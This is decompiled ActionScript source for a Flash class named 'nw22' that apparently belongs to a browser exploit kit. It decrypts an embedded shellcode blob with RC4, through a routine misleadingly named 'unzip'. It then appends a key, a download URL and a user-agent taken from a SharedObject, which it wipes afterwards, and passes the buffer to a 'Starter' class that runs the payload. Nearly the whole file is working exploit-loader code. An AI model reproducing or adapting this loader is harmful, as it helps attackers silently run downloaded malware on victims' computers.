package
{
   import flash.display.Sprite;
   import flash.utils.ByteArray;
   import flash.events.Event;
   import flash.net.SharedObject;
   
   public class nw22 extends Sprite
   {
      
      private static var skotina_class:Class = shell_rc4$787c4c90c7cad51cecb05491d510c088307104563;
       
      public function nw22()
      {
         super();
         if(stage)
         {
            this.init();
         }
         else
         {
            addEventListener("addedToStage",this.init);
         }
      }
      
      private function get_skotina(key:String, url:String, uas:String) : ByteArray
      {
         var _loc5_:String = "iso-8859-1";
         var _loc7_:String = "littleEndian";
         if(key == null || url == null || uas == null)
         {
            return null;
         }
         var _loc6_:ByteArray = new ByteArray();
         _loc6_ = unzip(_loc7_,new skotina_class() as ByteArray);
         _loc6_.position = 0;
         var _loc4_:ByteArray = new ByteArray();
         _loc4_.endian = _loc7_;
		 // shellcode
         _loc4_.writeBytes(_loc6_, 0, _loc6_.length);
		 // key, url, uas
         _loc4_.writeMultiByte(key,_loc5_);
         _loc4_.writeByte(34); // "
         _loc4_.writeByte(32); // space
         _loc4_.writeByte(34); // "
         _loc4_.writeMultiByte(url,_loc5_);
         _loc4_.writeByte(34); // "
         _loc4_.writeByte(32); // space
         _loc4_.writeByte(34); // "
         _loc4_.writeMultiByte(uas,_loc5_);
         _loc4_.writeByte(34); // "
         _loc4_.writeUnsignedInt(0);
		 // padding
         while(_loc4_.length % 4 != 0)
         {
            _loc4_.writeByte(0);
         }
         _loc4_.position = 0;
         return _loc4_;
      }
      
	  // this is actually RC4
      private function unzip(param1:String, param2:ByteArray) : ByteArray
      {
         var _loc5_:* = 0;
         var _loc6_:* = 0;
         var _loc7_:* = 0;
         var _loc4_:ByteArray = new ByteArray();
         var _loc8_:uint = 0;
         var _loc3_:ByteArray = new ByteArray();
         var _loc9_:ByteArray = new ByteArray();
         _loc9_.writeMultiByte(param1,"iso-8859-1");
         _loc6_ = uint(0);
         while(_loc6_ < 256)
         {
            _loc4_[_loc6_] = _loc6_;
            _loc6_++;
         }
         _loc6_ = uint(0);
         while(_loc6_ < 256)
         {
            _loc8_ = _loc8_ + _loc4_[_loc6_] + _loc9_[_loc6_ % _loc9_.length] & 255;
            _loc5_ = uint(_loc4_[_loc6_]);
            _loc4_[_loc6_] = _loc4_[_loc8_];
            _loc4_[_loc8_] = _loc5_;
            _loc6_++;
         }
         _loc6_ = uint(0);
         _loc8_ = 0;
         _loc7_ = uint(0);
         while(_loc7_ < param2.length)
         {
            _loc6_ = uint(_loc6_ + 1 & 255);
            _loc8_ = _loc8_ + _loc4_[_loc6_] & 255;
            _loc5_ = uint(_loc4_[_loc6_]);
            _loc4_[_loc6_] = _loc4_[_loc8_];
            _loc4_[_loc8_] = _loc5_;
            _loc3_[_loc7_] = param2[_loc7_] ^ _loc4_[_loc4_[_loc6_] + _loc4_[_loc8_] & 255];
            _loc7_++;
         }
         return _loc3_;
      }
      
      private function do_work(param1:*, param2:*, param3:String) : Boolean
      {
         var _loc4_:Starter = null;
         try
         {
            _loc4_ = new Starter(get_skotina(param1,param2,param3));
            var _loc6_:* = _loc4_.wait_and_run();
            return _loc6_;
         }
         catch(error:Error)
         {
         }
         return false;
      }
      
      private function init(param1:Event = null) : void
      {
         removeEventListener("addedToStage",this.init);
         var _loc3_:SharedObject = SharedObject.getLocal("nw22");
         var _loc4_:String = String(_loc3_.data.nw22.key);
         var _loc5_:String = String(_loc3_.data.nw22.url);
         var _loc2_:String = String(_loc3_.data.nw22.uas);
         _loc3_.clear();
         _loc3_.flush();
         try
         {
            this.do_work(_loc4_,_loc5_,_loc2_);
            return;
         }
         catch(error:Error)
         {
            return;
         }
      }
   }
}
